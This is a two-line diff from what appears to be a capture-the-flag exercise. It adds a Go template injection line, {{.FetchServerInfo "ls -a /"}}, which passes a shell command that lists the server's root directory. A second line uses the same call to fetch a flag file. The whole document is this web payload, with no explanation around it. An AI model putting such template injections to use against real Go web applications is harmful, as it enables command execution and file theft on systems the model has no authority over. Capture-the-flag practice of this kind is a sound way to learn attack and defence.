@@ -1,1 +1,2 @@
+Get Flag {{.FetchServerInfo "ls -a /"}}
 Get Flag {{.FetchServerInfo "flagaf84345550.txt"}}
